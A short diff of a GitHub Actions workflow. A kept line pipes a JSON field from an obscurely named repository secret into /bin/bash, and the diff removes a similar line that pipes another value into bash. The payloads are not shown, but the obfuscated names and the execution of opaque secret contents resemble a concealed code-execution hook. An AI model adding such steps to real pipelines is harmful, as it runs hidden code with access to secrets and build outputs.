@@ -22,7 +22,6 @@ jobs:
           xcfvi3367: ${{ secrets.xcfvi3367 }}
         run: |
           printf '%s' "$xcfvi3367" | jq -r .k7 | /bin/bash
-          echo $h88 | jq -r .wxtb61453 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
